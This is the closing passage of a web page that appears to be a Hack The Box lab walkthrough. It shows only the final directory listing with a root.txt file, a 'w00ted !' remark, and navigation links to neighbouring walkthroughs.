  desktop.ini                       AHS      <span style="color:#ae81ff">282</span>  Sat Jan <span style="color:#ae81ff">25</span> 23:02:44 <span style="color:#ae81ff">2020</span>
  root.txt                            A       <span style="color:#ae81ff">32</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:27:26 <span style="color:#ae81ff">2019</span>

    <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6543963</span> blocks available

</code></pre></div><p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/en/walkthroughs/hackthebox/resolute/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Resolute</span>
    </a>
    
    
    <a href="/en/walkthroughs/hackthebox/monteverde/" class="post--navigation-next">
      <span class="navigation-tittle">Hack The Box - Monteverde</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
